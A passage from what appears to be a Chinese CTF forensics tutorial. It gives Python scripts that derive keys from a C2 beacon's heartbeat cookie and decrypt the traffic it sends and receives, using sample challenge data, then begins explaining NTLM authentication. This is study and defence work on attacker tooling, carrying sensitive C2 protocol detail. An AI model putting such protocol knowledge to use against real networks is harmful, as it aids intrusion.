</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>aes_key</span><span class=o>.</span><span class=n>hex</span><span class=p>(),</span><span class=n>hmac_key</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 协商密钥和主机信息用RSA公钥加密之后放在了心跳包的cookie中</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie_data</span> <span class=o>=</span> <span class=s2>&#34;SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span><span class=p>,</span><span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>get_AES_HMAC_key</span><span class=p>(</span><span class=n>privateKey</span><span class=p>,</span><span class=n>cookie_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;AES key: </span><span class=si>{</span><span class=n>SHARED_KEY</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;HMAC key: </span><span class=si>{</span><span class=n>HMAC_KEY</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 00000000: 00 00 BE EF 00 00 00 5D  28 AB 95 1F C9 6B CB 93  .......](....k..</span>
</span></span><span class=line><span class=cl><span class=c1># 00000010: EC 13 CF 9D D5 F2 13 73  A8 03 A8 03 43 50 DF EC  .......s....CP..</span>
</span></span><span class=line><span class=cl><span class=c1># 00000020: 00 00 0B 50 00 00 0E 06  01 1D B0 00 00 00 00 77  ...P...........w</span>
</span></span><span class=line><span class=cl><span class=c1># 00000030: 02 04 D0 77 02 34 70 8C  B8 A8 C0 57 49 4E 2D 52  ...w.4p....WIN-R</span>
</span></span><span class=line><span class=cl><span class=c1># 00000040: 52 49 39 54 39 53 4E 38  35 44 09 41 64 6D 69 6E  RI9T9SN85D.Admin</span>
</span></span><span class=line><span class=cl><span class=c1># 00000050: 69 73 74 72 61 74 6F 72  09 61 72 74 69 66 61 63  istrator.artifac</span>
</span></span><span class=line><span class=cl><span class=c1># 00000060: 74 2E 65 78 65                                    t.exe</span>
</span></span><span class=line><span class=cl><span class=c1># AES key: 9fe14473479a283821241e2af78017e8</span>
</span></span><span class=line><span class=cl><span class=c1># HMAC key: 1e3d54f1b9f0e106773a59b7c379a89d</span></span></span></code></pre></td></tr></table></div></div><p>4、解密心跳包 /cm 中传输的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>shared_key</span><span class=p>,</span> <span class=n>hmac_key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>hmac_key</span><span class=p>,</span> <span class=n>encrypted_data</span><span class=p>,</span> <span class=n>digestmod</span><span class=o>=</span><span class=s2>&#34;sha256&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span> <span class=o>!=</span> <span class=n>signature</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message authentication failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>shared_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;9fe14473479a283821241e2af78017e8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;1e3d54f1b9f0e106773a59b7c379a89d&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data.txt&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data_length</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 数据总长度为：</span><span class=si>{</span><span class=n>encrypt_data_length</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#39;big&#39;, signed=False)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[:</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>signature</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>iv_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;abcdefghijklmnop&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dec</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>SHARED_KEY</span><span class=p>,</span> <span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=s1>&#39;=&#39;</span><span class=o>*</span><span class=mi>80</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] counter: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务返回长度: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务输出类型: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>pcapng_data</span> <span class=o>=</span> <span class=n>dec</span><span class=p>[</span><span class=mi>64</span><span class=p>:</span><span class=o>-</span><span class=mi>60</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;out.pcapng&#34;</span><span class=p>,</span><span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>pcapng_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>pcapng_data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># output = dec[12:int.from_bytes(dec[4:8], byteorder=&#39;big&#39;, signed=False)].decode(&#39;gbk&#39;,errors=&#39;ignore&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(output)</span></span></span></code></pre></td></tr></table></div></div><p>5、解密submit.php中回传的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>shared_key</span><span class=p>,</span> <span class=n>hmac_key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>hmac_key</span><span class=p>,</span> <span class=n>encrypted_data</span><span class=p>,</span> <span class=n>digestmod</span><span class=o>=</span><span class=s2>&#34;sha256&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span> <span class=o>!=</span> <span class=n>signature</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message authentication failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>shared_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;9fe14473479a283821241e2af78017e8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;1e3d54f1b9f0e106773a59b7c379a89d&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_datas</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;00000040efeda3e57f7d7fd589d11640ea0f9a4fe6bc91332723ffc5f43f78b37c21cc7485c44d6c8eb6af74fc7044046059c76519e493e351c9f631d6785d5c07eae9e3&#34;</span><span class=p>,</span><span class=s2>&#34;000001602a99f7cc51face35199e8b1a4a5616e0301591b6f1f48b1d000149cb83d6a81e9659849a52c4f50a8629b0dfb7c036df406b44d449e40fe18df3594721e1f5849662271c1ea18b18c8eb58af5ee2c3a784852dd1c4a5c699f9518d2e2fc70d756cd68361ac794eed4eae6b062be6c31651caf93954f2a89b10e25b1fd9757ec17ee8b97038c4babb73c4f21688f5d235797844c2c9c288fac3fd2bd9cf5373956389b7e5232e35b6f268f9d67ba54f3e7e1606d4cb4020d5f480c6e5f4409b8d87e0443ae0bcfe93d286291ba6bfd0c7f37593581d90bb4ab7cfb065b4421a727f120fb491c2dc01797e38996dfc123fb120c5ed312577cc917d8a435b73c25b6d29ef0bad595100256c9aa5571e5c0ce0a8ea2c173ca1fae577fa924506b75b86522052f019d6843d74dc6fbdf2219b77e020a049c4e77df3658c80bcb703f8f878ff2f70c5c69d0cf6f4efb5a755ba854dfa5777a23989286770da6e0444d0&#34;</span><span class=p>,</span><span class=s2>&#34;000000d0c72ef8b74a7d8acc332695b62448280f9a4eaa12457de4adcad279b0563f2d4cb0707f7e2853c45acf28a365d905cf8ca421d557bd7655cbd50aafbdbe5f3f570c9c3d876d0c21b661ca5c46e09f987f7e1263f6d33c34db28a2fd342fe48e5801d1a97fb88e00f0c648ec889f6b72d71edd2eed5affd32bc8d51e27fcc148d16823c1bc235b0e16d9d477bd0b4582941db373e171cce78b10c869eb987baf3fd9f879b236be6f3af43b7742f6241dfe02ab696c96f1779d0003d6b2720d1c93890e75fcce939f1c8e0922ce5044bc3a&#34;</span><span class=p>,</span><span class=s2>&#34;00000100f24f15cd6f33c36e70ca228d10babfac1cf6bfbb9b6923a7828c9ed30b76d3ce1cb3d8f97c358bf90004e771ac646b1b996fd248ac8f0b460e0a36950dffcde04f3bae831982b528393f3a3c771310ba0c0bb7418ba5e8734a6bd37bc8a51cc0683c0904e0f404180e4c4c34720a3e5d6767c435f1746e6b93a13a2ecdc8074089e684b90748fc1a7e24e66bd637673437d9e24a37ce6f584b478e2f0485f3c05414dd4c35eb9ecfed8d4fbdab54db4233258f4fea6ed515a1030feeb184db94a4841236b491d2f7379e10f52d50ae573cd6f4504aa9750da273fa65c2a9eaf9b9bb014cafc53a9e9f0042bfcd5d24fc1b29173fd3308ff08d30b2a7d42132d4&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>encrypt_data</span> <span class=ow>in</span> <span class=n>encrypt_datas</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># encrypt_data = base64.b64decode(encrypt_data)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data_length</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data_l</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[</span><span class=mi>4</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>data1</span> <span class=o>=</span> <span class=n>encrypt_data_l</span><span class=p>[:</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>signature</span> <span class=o>=</span> <span class=n>encrypt_data_l</span><span class=p>[</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>iv_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;abcdefghijklmnop&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>dec</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>data1</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>SHARED_KEY</span><span class=p>,</span> <span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=s1>&#39;=&#39;</span><span class=o>*</span><span class=mi>80</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] counter: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务返回长度: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务输出类型: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>=</span> <span class=n>dec</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)]</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;gbk&#39;</span><span class=p>,</span><span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>dec</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>output</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>例题1-2024西湖论剑初赛-cscs</p><h2 class=heading-element id=ntlm认证流量分析><span>NTLM认证流量分析</span>
<a href=#ntlm%e8%ae%a4%e8%af%81%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=ntlm认证的基本概念><span>NTLM认证的基本概念</span>
<a href=#ntlm%e8%ae%a4%e8%af%81%e7%9a%84%e5%9f%ba%e6%9c%ac%e6%a6%82%e5%bf%b5 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h4 class=heading-element id=ntlm-协议概述><span>NTLM 协议概述：</span>
<a href=#ntlm-%e5%8d%8f%e8%ae%ae%e6%a6%82%e8%bf%b0 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><blockquote><p>NTLM是一种专用于Windows网络的 挑战/响应 认证协议。它本身并非独立协议，其消息必须嵌入在上层协议（如SMB、LDAP、HTTP）中进行传输。这一点与更为灵活的Kerberos协议不同，后者既可嵌入也可作为独立的应用层协议运行。</p></blockquote><p>NTLM 认证由以下三种消息构成：</p><blockquote><p>Type1 协商：主要用于确认双方协议版本</p><p>Type2 质询：就是 挑战/响应 认证机制起作用的范畴</p><p>Type3 验证 在质询完成后验证结果</p></blockquote><h4 class=heading-element id=ntlm-认证的完整流程><span>NTLM 认证的完整流程：</span>
<a href=#ntlm-%e8%ae%a4%e8%af%81%e7%9a%84%e5%ae%8c%e6%95%b4%e6%b5%81%e7%a8%8b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><ul><li><p>第一步 - 协商：认证始于客户端向服务器发送Type 1协商消息，告知服务器它所支持的NTLM协议版本和一系列功能列表。</p></li><li><p>第二步 - 质询：服务器在收到请求后，会回复一个Type 2质询消息。此消息不仅确认了双方认可的功能列表，其最核心的作用是向客户端发送一个由服务器生成的、一次性的16位随机数，即Challenge（质询）。</p></li><li><p>第三步 - 响应：客户端收到Challenge后，利用本机存储的对应用户密码的NTLM Hash对其进行加密，生成一个唯一的Response（响应）。随后，客户端将Response、用户名以及Challenge一同封装在Type 3消息中发回服务器。</p></li><li><p>第四步 - 验证：服务器在拿到Type 3消息后，需要验证Response的有效性。如果用户是本地账户，服务器会用自己的数据完成校验；但如果用户属于域账户，服务器自身没有用户密码的Hash，此时它会通过Netlogon协议与域控制器建立安全通道，将完整的Type 1、Type 2、Type 3消息转发给域控。</p></li><li><p>（第五步 - 域控裁决）：域控制器作为最终的认证机构，它使用自身数据库中的用户Hash和收到的Challenge，以相同的算法重新计算Response。通过比对计算结果与客户端发来的Response是否一致，域控能够做出最终裁决，并将认证成功与否的结果返回给服务器，从而完成整个认证流程。</p></li></ul><h4 class=heading-element id=net-ntlm-hash-与响应类型><span>Net-NTLM Hash 与响应类型</span>
